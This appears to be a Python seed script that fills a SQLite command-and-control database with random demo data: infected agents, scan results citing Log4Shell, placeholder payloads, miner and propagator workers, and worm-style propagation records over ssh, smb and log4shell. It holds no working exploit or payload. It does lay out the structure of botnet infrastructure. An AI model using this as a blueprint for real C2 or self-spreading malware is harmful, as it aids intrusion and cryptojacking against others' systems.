#!/usr/bin/env python3
import sqlite3, uuid, random, json

conn = sqlite3.connect('data/c2.db')
c = conn.cursor()

# Get agents
agents = c.execute('SELECT id FROM agents WHERE is_alive=1').fetchall()
print(f'Agents: {len(agents)}')

# Create scan results
for agent in agents:
    for i in range(3):
        c.execute('''INSERT INTO scan_results (id, agent_id, target, ports, services, vulnerabilities, status)
            VALUES (?, ?, ?, ?, ?, ?, 'completed')''',
            (str(uuid.uuid4()), agent[0], f'192.168.{random.randint(1,254)}.{random.randint(1,254)}',
             '[22,80,443]', '{"22":"ssh"}', '["CVE-2021-44228"]'))

# Create payloads
for pt in ['windows_exe', 'linux_elf', 'macos_macho', 'python_script', 'powershell']:
    c.execute('INSERT INTO payloads (id, name, type, platform, size, content) VALUES (?, ?, ?, ?, ?, ?)',
        (str(uuid.uuid4()), f'payload_{pt}', pt, pt.split('_')[0], random.randint(10000,100000), 'base64'))

# Create workers
for wt in ['scanner', 'exploiter', 'miner', 'propagator']:
    c.execute('INSERT INTO workers (id, name, type, status) VALUES (?, ?, ?, "active")',
        (str(uuid.uuid4()), f'{wt}_{random.randint(1,100)}', wt))

# Create propagation results
for agent in agents:
    for i in range(5):
        success = random.choice([0, 1])
        c.execute('INSERT INTO propagation_results (id, agent_id, target_ip, method, success, new_agent_id) VALUES (?, ?, ?, ?, ?, ?)',
            (str(uuid.uuid4()), agent[0], f'10.0.{random.randint(1,254)}.{random.randint(1,254)}',
             random.choice(['ssh', 'smb', 'log4shell']), success, str(uuid.uuid4()) if success else None))

conn.commit()
conn.close()
print('✅ Demo data created')
